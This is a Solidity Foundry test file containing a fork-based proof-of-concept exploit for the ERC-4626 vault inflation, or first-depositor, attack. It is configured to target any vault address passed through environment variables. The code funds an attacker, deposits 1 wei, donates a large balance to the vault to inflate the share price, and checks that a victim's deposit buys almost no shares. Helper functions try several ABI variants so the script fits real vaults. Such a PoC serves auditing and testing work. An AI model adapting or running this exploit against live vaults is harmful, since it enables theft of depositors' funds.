// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- ERC4626 inflation / first-depositor attack
/// @notice A vault prices shares as totalAssets / totalSupply. The first
///         depositor deposits 1 wei (1 share), then DONATES a huge amount
///         directly to the vault. Share price explodes, so the NEXT
///         victim's deposit buys ~0 shares -- their funds are captured by
///         the first depositor.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set ASSET / WHALE (a holder who can
///      fund the attacker) / adapt deposit() to the vault's real ABI.

interface IVault {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
    function asset() external view returns (address);
}

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: an asset holder on this fork who can fund the attacker.
    address public constant WHALE = address(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The asset reader is a guess: `asset()` is standard for ERC-4626, but a
    /// vault in the wild may expose `token()` or `underlying()`.
    function _assetOf() internal view returns (bool found, address a) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("asset()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("token()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("underlying()"));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (address)));
        return (false, address(0));
    }

    /// The share reader is a guess too — `previewDeposit` is standard, but
    /// `convertToShares` is equally common.
    function _sharesFor(uint256 assets) internal view returns (bool found, uint256 shares) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("previewDeposit(uint256)", assets));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("convertToShares(uint256)", assets));
        if (ok && ret.length >= 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    /// The deposit entry point is a guess. Success here is only the setup
    /// landing — the verdict is the victim's share count below.
    function _depositOnce(address from, address receiver, uint256 assets) internal returns (bool) {
        vm.prank(from);
        (bool ok,) = target.call(abi.encodeWithSignature("deposit(uint256,address)", assets, receiver));
        if (ok) return true;
        vm.prank(from);
        (ok,) = target.call(abi.encodeWithSignature("deposit(uint256)", assets));
        if (ok) return true;
        vm.prank(from);
        (ok,) = target.call(abi.encodeWithSignature("mint(uint256,address)", assets, receiver));
        return ok;
    }

    function test_exploit() public {
        require(WHALE != address(0), "set WHALE to an asset holder on this fork");

        address attackerEOA = makeAddr("attacker");
        address victimEOA = makeAddr("victim");

        (bool assetFound, address asset) = _assetOf();
        require(
            assetFound,
            "no asset reader worked (tried asset(), token(), underlying()). This does NOT establish safety."
        );

        // Fund both from a whale.
        vm.prank(WHALE);
        IERC20(asset).transfer(attackerEOA, 2000 ether);
        vm.prank(WHALE);
        IERC20(asset).transfer(victimEOA, 1000 ether);

        // 1. Attacker deposits 1 wei -> 1 share (first depositor).
        vm.prank(attackerEOA);
        IERC20(asset).approve(target, 1);
        require(
            _depositOnce(attackerEOA, attackerEOA, 1),
            "no deposit entry point accepted the first deposit (tried deposit(uint256,address), deposit(uint256), mint(uint256,address)). This does NOT establish safety."
        );

        // 2. Attacker DONATES 1000 ether directly -- share price explodes.
        vm.prank(attackerEOA);
        IERC20(asset).transfer(target, 1000 ether);

        // 3. The victim's deposit buys ~0 shares. The observable is the SHARE
        //    COUNT, not whether a call returned.
        (bool sharesFound, uint256 victimShares) = _sharesFor(1000 ether);
        require(
            sharesFound,
            "no share reader worked (tried previewDeposit(uint256), convertToShares(uint256)). This does NOT establish safety."
        );

        console.log("victim shares for 1000 ether deposit:", victimShares);
        assertLt(
            victimShares,
            1000 ether / 100,
            "the victim received a fair share amount, so the inflation did not land. This does NOT establish safety: the first deposit may not have taken a share, or the donation may not have moved the price."
        );
    }
}
